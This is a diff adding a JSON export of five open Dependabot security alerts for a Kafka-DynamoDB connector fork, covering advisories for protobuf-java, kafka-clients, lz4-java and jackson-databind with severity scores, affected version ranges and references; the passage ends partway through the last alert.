@@ -1,0 +1,2015 @@
+[
+  {
+    "number": 1,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "com.google.protobuf:protobuf-java"
+      },
+      "manifest_path": "build.gradle.kts",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-735f-pc8j-v9w8",
+      "cve_id": "CVE-2024-7254",
+      "summary": "protobuf-java has potential Denial of Service issue",
+      "description": "### Summary\nWhen parsing unknown fields in the Protobuf Java Lite and Full library, a maliciously crafted message can cause a StackOverflow error and lead to a program crash.\n\nReporter: Alexis Challande, Trail of Bits Ecosystem Security Team <ecosystem@trailofbits.com>\n\nAffected versions: This issue affects all versions of both the Java full and lite Protobuf runtimes, as well as Protobuf for Kotlin and JRuby, which themselves use the Java Protobuf runtime.\n\n### Severity\n[CVE-2024-7254](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-7254) **High** CVSS4.0 Score 8.7 (NOTE: there may be a delay in publication)\nThis is a potential Denial of Service. Parsing nested groups as unknown fields with DiscardUnknownFieldsParser or Java Protobuf Lite parser, or against Protobuf map fields, creates unbounded recursions that can be abused by an attacker.\n\n### Proof of Concept\nFor reproduction details, please refer to the unit tests (Protobuf Java [LiteTest](https://github.com/protocolbuffers/protobuf/blob/a037f28ff81ee45ebe008c64ab632bf5372242ce/java/lite/src/test/java/com/google/protobuf/LiteTest.java) and [CodedInputStreamTest](https://github.com/protocolbuffers/protobuf/blob/a037f28ff81ee45ebe008c64ab632bf5372242ce/java/core/src/test/java/com/google/protobuf/CodedInputStreamTest.java)) that identify the specific inputs that exercise this parsing weakness.\n\n### Remediation and Mitigation\nWe have been working diligently to address this issue and have released a mitigation that is available now. Please update to the latest available versions of the following packages:\n* protobuf-java (3.25.5, 4.27.5, 4.28.2)\n* protobuf-javalite (3.25.5, 4.27.5, 4.28.2)\n* protobuf-kotlin (3.25.5, 4.27.5, 4.28.2)\n* protobuf-kotlin-lite (3.25.5, 4.27.5, 4.28.2)\n* com-protobuf [JRuby gem only] (3.25.5, 4.27.5, 4.28.2)",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.google.protobuf:protobuf-java"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "< 3.25.5",
+          "first_patched_version": {
+            "identifier": "3.25.5"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.google.protobuf:protobuf-javalite"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "< 3.25.5",
+          "first_patched_version": {
+            "identifier": "3.25.5"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.google.protobuf:protobuf-kotlin"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "< 3.25.5",
+          "first_patched_version": {
+            "identifier": "3.25.5"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.google.protobuf:protobuf-kotlin-lite"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "< 3.25.5",
+          "first_patched_version": {
+            "identifier": "3.25.5"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "rubygems",
+            "name": "google-protobuf"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "< 3.25.5",
+          "first_patched_version": {
+            "identifier": "3.25.5"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "rubygems",
+            "name": "google-protobuf"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 4.0.0.rc.1, < 4.27.5",
+          "first_patched_version": {
+            "identifier": "4.27.5"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "rubygems",
+            "name": "google-protobuf"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 4.28.0.rc.1, < 4.28.2",
+          "first_patched_version": {
+            "identifier": "4.28.2"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.google.protobuf:protobuf-kotlin-lite"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 4.0.0-RC1, < 4.27.5",
+          "first_patched_version": {
+            "identifier": "4.27.5"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.google.protobuf:protobuf-kotlin-lite"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 4.28.0-RC1, < 4.28.2",
+          "first_patched_version": {
+            "identifier": "4.28.2"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.google.protobuf:protobuf-kotlin"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 4.0.0-RC1, < 4.27.5",
+          "first_patched_version": {
+            "identifier": "4.27.5"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.google.protobuf:protobuf-kotlin"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 4.28.0-RC1, < 4.28.2",
+          "first_patched_version": {
+            "identifier": "4.28.2"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.google.protobuf:protobuf-javalite"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 4.0.0-RC1, < 4.27.5",
+          "first_patched_version": {
+            "identifier": "4.27.5"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.google.protobuf:protobuf-javalite"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 4.28.0-RC1, < 4.28.2",
+          "first_patched_version": {
+            "identifier": "4.28.2"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.google.protobuf:protobuf-java"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 4.0.0-RC1, < 4.27.5",
+          "first_patched_version": {
+            "identifier": "4.27.5"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.google.protobuf:protobuf-java"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 4.28.0-RC1, < 4.28.2",
+          "first_patched_version": {
+            "identifier": "4.28.2"
+          }
+        }
+      ],
+      "severity": "high",
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "score": 8.7
+        }
+      },
+      "epss": {
+        "percentage": 0.02772,
+        "percentile": 0.85508
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-20",
+          "name": "Improper Input Validation"
+        },
+        {
+          "cwe_id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption"
+        },
+        {
+          "cwe_id": "CWE-787",
+          "name": "Out-of-bounds Write"
+        }
+      ],
+      "identifiers": [
+        {
+          "value": "GHSA-735f-pc8j-v9w8",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2024-7254",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/protocolbuffers/protobuf/security/advisories/GHSA-735f-pc8j-v9w8"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-7254"
+        },
+        {
+          "url": "https://github.com/protocolbuffers/protobuf/commit/4728531c162f2f9e8c2ca1add713cfee2db6be3b"
+        },
+        {
+          "url": "https://github.com/protocolbuffers/protobuf/commit/850fcce9176e2c9070614dab53537760498c926b"
+        },
+        {
+          "url": "https://github.com/protocolbuffers/protobuf/commit/9a5f5fe752a20cbac2e722b06949ac985abdd534"
+        },
+        {
+          "url": "https://github.com/protocolbuffers/protobuf/commit/ac9fb5b4c71b0dd80985b27684e265d1f03abf46"
+        },
+        {
+          "url": "https://github.com/protocolbuffers/protobuf/commit/cc8b3483a5584b3301e3d43d17eb59704857ffaa"
+        },
+        {
+          "url": "https://github.com/protocolbuffers/protobuf/commit/d6c82fc55a76481c676f541a255571e8950bb8c3"
+        },
+        {
+          "url": "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/google-protobuf/CVE-2024-7254.yml"
+        },
+        {
+          "url": "https://security.netapp.com/advisory/ntap-20241213-0010"
+        },
+        {
+          "url": "https://security.netapp.com/advisory/ntap-20250418-0006"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-735f-pc8j-v9w8"
+        }
+      ],
+      "published_at": "2024-09-19T16:06:03Z",
+      "updated_at": "2025-09-10T20:53:05Z",
+      "withdrawn_at": null
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "com.google.protobuf:protobuf-java"
+      },
+      "severity": "high",
+      "vulnerable_version_range": "< 3.25.5",
+      "first_patched_version": {
+        "identifier": "3.25.5"
+      }
+    },
+    "url": "https://api.github.com/repos/dhasani23/dynamodb-kafka-konnect-fork/dependabot/alerts/1",
+    "html_url": "https://github.com/dhasani23/dynamodb-kafka-konnect-fork/security/dependabot/1",
+    "created_at": "2026-05-13T00:41:27Z",
+    "updated_at": "2026-05-13T00:41:27Z",
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 2,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "org.apache.kafka:kafka-clients"
+      },
+      "manifest_path": "build.gradle.kts",
+      "scope": "runtime",
+      "relationship": "direct"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-5qcv-4rpc-jp93",
+      "cve_id": "CVE-2026-35554",
+      "summary": "Apache Kafka Clients: Kafka Producer Message Corruption and Misrouting via Buffer Pool Race Condition",
+      "description": "A race condition in the Apache Kafka Java producer client\u2019s buffer pool management can cause messages to be silently delivered to incorrect topics.\n\nWhen a produce batch expires due to delivery.timeout.ms while a network request containing that batch is still in flight, the batch\u2019s ByteBuffer is prematurely deallocated and returned to the buffer pool. If a subsequent producer batch\u2014potentially destined for a different topic\u2014reuses this freed buffer before the original network request completes, the buffer contents may become corrupted. This can result in messages being delivered to unintended topics without any error being reported to the producer.\n\n\nData Confidentiality:\nMessages intended for one topic may be delivered to a different topic, potentially exposing sensitive data to consumers who have access to the destination topic but not the intended source topic.\n\nData Integrity:\nConsumers on the receiving topic may encounter unexpected or incompatible messages, leading to deserialization failures, processing errors, and corrupted downstream data.\n\nThis issue affects Apache Kafka versions \u2264 3.9.1, \u2264 4.0.1, and\u00a0 \u2264 4.1.1.\n\nKafka users are advised to upgrade to 3.9.2, 4.0.2, 4.1.2, 4.2.0, or later to address this vulnerability.",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "org.apache.kafka:kafka-clients"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 2.8.0, < 3.9.2",
+          "first_patched_version": {
+            "identifier": "3.9.2"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "org.apache.kafka:kafka-clients"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 4.0.0, < 4.0.2",
+          "first_patched_version": {
+            "identifier": "4.0.2"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "org.apache.kafka:kafka-clients"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 4.1.0, < 4.1.2",
+          "first_patched_version": {
+            "identifier": "4.1.2"
+          }
+        }
+      ],
+      "severity": "high",
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
+        "score": 8.7
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
+          "score": 8.7
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.00647,
+        "percentile": 0.49533
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-362",
+          "name": "Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')"
+        }
+      ],
+      "identifiers": [
+        {
+          "value": "GHSA-5qcv-4rpc-jp93",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-35554",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-35554"
+        },
+        {
+          "url": "https://issues.apache.org/jira/browse/KAFKA-19012"
+        },
+        {
+          "url": "https://lists.apache.org/thread/f07x7j8ovyqhjd1to25jsnqbm6wj01d6"
+        },
+        {
+          "url": "http://www.openwall.com/lists/oss-security/2026/04/07/6"
+        },
+        {
+          "url": "https://github.com/apache/kafka/pull/21065"
+        },
+        {
+          "url": "https://github.com/apache/kafka/pull/21285"
+        },
+        {
+          "url": "https://github.com/apache/kafka/pull/21286"
+        },
+        {
+          "url": "https://github.com/apache/kafka/pull/21287"
+        },
+        {
+          "url": "https://github.com/apache/kafka/pull/21288"
+        },
+        {
+          "url": "https://github.com/apache/kafka/commit/1df2ac5b2ba4d1b5ed54b895ff6fb9539303ccb5"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-5qcv-4rpc-jp93"
+        }
+      ],
+      "published_at": "2026-04-07T15:30:50Z",
+      "updated_at": "2026-04-13T19:22:23Z",
+      "withdrawn_at": null
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "org.apache.kafka:kafka-clients"
+      },
+      "severity": "high",
+      "vulnerable_version_range": ">= 2.8.0, < 3.9.2",
+      "first_patched_version": {
+        "identifier": "3.9.2"
+      }
+    },
+    "url": "https://api.github.com/repos/dhasani23/dynamodb-kafka-konnect-fork/dependabot/alerts/2",
+    "html_url": "https://github.com/dhasani23/dynamodb-kafka-konnect-fork/security/dependabot/2",
+    "created_at": "2026-05-13T00:41:27Z",
+    "updated_at": "2026-05-13T00:41:27Z",
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 3,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "org.lz4:lz4-java"
+      },
+      "manifest_path": "build.gradle.kts",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-cmp6-m4wj-q63q",
+      "cve_id": "CVE-2025-66566",
+      "summary": "yawkat LZ4 Java has a possible information leak in Java safe decompressor",
+      "description": "### Summary\n\nInsufficient clearing of the output buffer in Java-based decompressor implementations in lz4-java 1.10.0 and earlier allows remote attackers to read previous buffer contents via crafted compressed input. In applications where the output buffer is reused without being cleared, this may lead to disclosure of sensitive data.\n\nJNI-based implementations are *not* affected.\n\n### Details\n\nDuring the decompression process, the lz4 algorithm may have to repeat data that was previously decompressed in the same input frame. In the Java implementation, this is implemented by copy operations within the output buffer.\n\nWith a crafted input, an attacker may induce the Java implementation to copy from a region in the output buffer that does not contain decompressed data yet. If that region contains sensitive information because the output buffer was not cleared prior to decompression, that data will then be copied to the decompressed output.\n\n- `LZ4Factory.nativeInstance().safeDecompressor()` *is not* affected.\n- `LZ4Factory.nativeInstance().fastDecompressor()` *is* affected because it actually uses `safeInstance()` since 1.8.1. In 1.8.0 and earlier versions, this implementation is instead vulnerable to the more severe [CVE\u20102025\u201012183](https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-12183), so downgrading is not a solution.\n- Both decompressors of `LZ4Factory.safeInstance()`, `LZ4Factory.unsafeInstance()` and `LZ4Factory.fastestJavaInstance()` are affected.\n- `LZ4Factory.fastestInstance()` uses the `nativeInstance` or `fastestJavaInstance` depending on platform. `LZ4Factory.fastestInstance().fastDecompressor()` is always affected, while `LZ4Factory.fastestInstance().safeDecompressor()` is affected only when JNI cannot be used (e.g. on unsupported platforms).\n\nIndependent of this vulnerability, it is recommended that users migrate from `fastDecompressor` to `safeDecompressor`, as the latter is more performant (despite the name).\n\nThe impact of this vulnerability depends on how user code interacts with the decompression API. Users that allocate a new destination buffer each time, or use only zeroed buffers, are not impacted. When the buffer is reused, however, the confidentiality impact can be severe. This vulnerability is marked as VC:H out of caution.\n\n### Mitigation\n\nlz4-java 1.10.1 fixes this issue without requiring changes in user code.\n\nIf you cannot upgrade to 1.10.1, you can mitigate this vulnerability by zeroing the output buffer before passing it to the decompression function.\n\n### Relation to CVE\u20102025\u201012183\n\nThis CVE is a different attack than [CVE\u20102025\u201012183](https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-12183), affecting different implementations with different impact. This new vulnerability was discovered by [CodeIntelligence](https://www.code-intelligence.com/) during research that followed up on CVE\u20102025\u201012183. Users are recommended to upgrade to 1.10.1 to fix both vulnerabilities.",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "at.yawk.lz4:lz4-java"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "<= 1.10.0",
+          "first_patched_version": {
+            "identifier": "1.10.1"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "org.lz4:lz4-java"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "<= 1.8.1",
+          "first_patched_version": null
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "org.lz4:lz4-pure-java"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "<= 1.8.1",
+          "first_patched_version": null
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "net.jpountz.lz4:lz4"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "<= 1.8.1",
+          "first_patched_version": null
+        }
+      ],
+      "severity": "high",
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": 0.0
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+          "score": 8.2
+        }
+      },
+      "epss": {
+        "percentage": 0.00605,
+        "percentile": 0.47552
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-201",
+          "name": "Insertion of Sensitive Information Into Sent Data"
+        }
+      ],
+      "identifiers": [
+        {
+          "value": "GHSA-cmp6-m4wj-q63q",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2025-66566",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/yawkat/lz4-java/security/advisories/GHSA-cmp6-m4wj-q63q"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-66566"
+        },
+        {
+          "url": "https://github.com/yawkat/lz4-java/commit/33d180cb70c4d93c80fb0dc3ab3002f457e93840"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-cmp6-m4wj-q63q"
+        }
+      ],
+      "published_at": "2025-12-05T18:54:55Z",
+      "updated_at": "2025-12-05T18:54:56Z",
+      "withdrawn_at": null
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "org.lz4:lz4-java"
+      },
+      "severity": "high",
+      "vulnerable_version_range": "<= 1.8.1",
+      "first_patched_version": null
+    },
+    "url": "https://api.github.com/repos/dhasani23/dynamodb-kafka-konnect-fork/dependabot/alerts/3",
+    "html_url": "https://github.com/dhasani23/dynamodb-kafka-konnect-fork/security/dependabot/3",
+    "created_at": "2026-05-13T00:41:27Z",
+    "updated_at": "2026-05-13T00:41:27Z",
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 4,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "org.lz4:lz4-java"
+      },
+      "manifest_path": "build.gradle.kts",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-vqf4-7m7x-wgfc",
+      "cve_id": "CVE-2025-12183",
+      "summary": "LZ4 Java Compression has Out-of-bounds memory operations which can cause DoS",
+      "description": "Out-of-bounds memory operations in org.lz4:lz4-java 1.8.0 and earlier allow remote attackers to cause denial of service and read adjacent memory via untrusted compressed input.\n\nThis is fixed in a forked release: at.yawk.lz4:lz4-java version 1.8.1. The original project has been archived: https://github.com/lz4/lz4-java, and Sonatype has added a redirect from org.lz4:lz4-java:1.8.1 to the new group ID.",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "at.yawk.lz4:lz4-java"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "< 1.8.1",
+          "first_patched_version": {
+            "identifier": "1.8.1"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "org.lz4:lz4-java"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "< 1.8.1",
+          "first_patched_version": {
+            "identifier": "1.8.1"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "org.lz4:lz4-pure-java"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "<= 1.8.0",
+          "first_patched_version": null
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "net.jpountz.lz4:lz4"
+          },
+          "severity": "high",
+          "vulnerable_version_range": "<= 1.3.0",
+          "first_patched_version": null
+        }
+      ],
+      "severity": "high",
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": 0.0
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "score": 8.8
+        }
+      },
+      "epss": {
+        "percentage": 0.00697,
+        "percentile": 0.51536
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-125",
+          "name": "Out-of-bounds Read"
+        }
+      ],
+      "identifiers": [
+        {
+          "value": "GHSA-vqf4-7m7x-wgfc",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2025-12183",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-12183"
+        },
+        {
+          "url": "https://github.com/yawkat/lz4-java/releases/tag/v1.8.1"
+        },
+        {
+          "url": "https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-12183"
+        },
+        {
+          "url": "https://www.sonatype.com/security-advisories/cve-2025-12183"
+        },
+        {
+          "url": "http://www.openwall.com/lists/oss-security/2025/12/01/5"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-vqf4-7m7x-wgfc"
+        }
+      ],
+      "published_at": "2025-11-28T18:30:23Z",
+      "updated_at": "2025-12-31T22:00:13Z",
+      "withdrawn_at": null
+    },
+    "security_vulnerability": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "org.lz4:lz4-java"
+      },
+      "severity": "high",
+      "vulnerable_version_range": "< 1.8.1",
+      "first_patched_version": {
+        "identifier": "1.8.1"
+      }
+    },
+    "url": "https://api.github.com/repos/dhasani23/dynamodb-kafka-konnect-fork/dependabot/alerts/4",
+    "html_url": "https://github.com/dhasani23/dynamodb-kafka-konnect-fork/security/dependabot/4",
+    "created_at": "2026-05-13T00:41:27Z",
+    "updated_at": "2026-05-13T00:41:27Z",
+    "dismissed_at": null,
+    "dismissed_by": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "fixed_at": null,
+    "auto_dismissed_at": null
+  },
+  {
+    "number": 5,
+    "state": "open",
+    "dependency": {
+      "package": {
+        "ecosystem": "maven",
+        "name": "com.fasterxml.jackson.core:jackson-databind"
+      },
+      "manifest_path": "build.gradle.kts",
+      "scope": "runtime",
+      "relationship": "transitive"
+    },
+    "security_advisory": {
+      "ghsa_id": "GHSA-rmj7-2vxq-3g9f",
+      "cve_id": "CVE-2026-54513",
+      "summary": "jackson-databind has an array subtype allowlist bypass in BasicPolymorphicTypeValidator (allowIfSubTypeIsArray)",
+      "description": "## Summary\n`BasicPolymorphicTypeValidator.Builder.allowIfSubTypeIsArray()` allowlists any array type based only on `clazz.isArray()`, without validating the array's component (element) type against the configured allowlist. A PTV built with `allowIfSubTypeIsArray()` plus an explicit concrete-type allowlist therefore still permits `EvilType[]` even though `EvilType` is not allowlisted. When Jackson deserializes the elements and no per-element type IDs are present, it instantiates the component type directly with no further PTV check, bypassing the allowlist.\n\n## Impact\nApplications using `BasicPolymorphicTypeValidator` with `allowIfSubTypeIsArray()` as a safeguard get no protection for concrete array component types; an attacker controlling JSON can instantiate non-allowlisted types via an array wrapper, re-opening the gadget-instantiation risk PTV is meant to prevent.\n\n## Affected / Patched (verified via `git tag --contains`)\n- 2.18 line: `>= 2.10.0, < 2.18.8` -> fixed in **2.18.8**\n- 2.19-2.21 line: `>= 2.19.0, < 2.21.4` -> fixed in **2.21.4**\n- 3.x line: `>= 3.0.0, < 3.1.4` -> fixed in **3.1.4**\n\n`PolymorphicTypeValidator` was added in 2.10.0 so vulnerability N/A for versions prior to that.\n\n## Severity / CWE\nMaintainer: significant. Reporter: HIGH. CWE-184 (Incomplete List of Disallowed Inputs); related CWE-502.\n\n## Upstream fix\nFasterXML/jackson-databind#5981; fix PR #5983 (`24529da`), 2.18 backport PR #5984 (`01d1692`). Released 2026-06-04 in 2.18.8 / 2.21.4 / 3.1.4.\n\n## Credits\nOmkhar Arasaratnam (@omkhar) - finder.",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.fasterxml.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 2.10.0, < 2.18.8",
+          "first_patched_version": {
+            "identifier": "2.18.8"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.fasterxml.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 2.19.0, < 2.21.4",
+          "first_patched_version": {
+            "identifier": "2.21.4"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "com.fasterxml.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 3.0.0, < 3.1.4",
+          "first_patched_version": {
+            "identifier": "3.1.4"
+          }
+        },
+        {
+          "package": {
+            "ecosystem": "maven",
+            "name": "tools.jackson.core:jackson-databind"
+          },
+          "severity": "high",
+          "vulnerable_version_range": ">= 3.0.0, < 3.1.4",
+          "first_patched_version": {
+            "identifier": "3.1.4"
+          }
+        }
+      ],
+      "severity": "high",
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "score": 8.1
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "score": 8.1
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "epss": {
+        "percentage": 0.01226,
+        "percentile": 0.6752
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-184",
+          "name": "Incomplete List of Disallowed Inputs"
+        }
+      ],
+      "identifiers": [
+        {
+          "value": "GHSA-rmj7-2vxq-3g9f",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-54513",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-rmj7-2vxq-3g9f"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/issues/5981"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/issues/5983"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/pull/5984"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/commit/01d1692c8d0ed03e51a0e3c4f8a9e6908e4931e5"
+        },
+        {
+          "url": "https://github.com/FasterXML/jackson-databind/commit/24529da29fdf46ff94ca38de9ebf31cd188f5e8e"
+        },
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-54513"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:36839"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:40895"
+        },
+        {
+          "url": "https://access.redhat.com/security/cve/CVE-2026-54513"
+        },
+        {
+          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2492010"
+        },
+        {
+          "url": "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-54513.json"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:41951"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:43218"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:44271"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:44066"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:44065"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:44064"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:44063"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:44062"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:44061"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:43400"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:48151"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:48095"
+        },
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2026:50849"
+        },
+        {
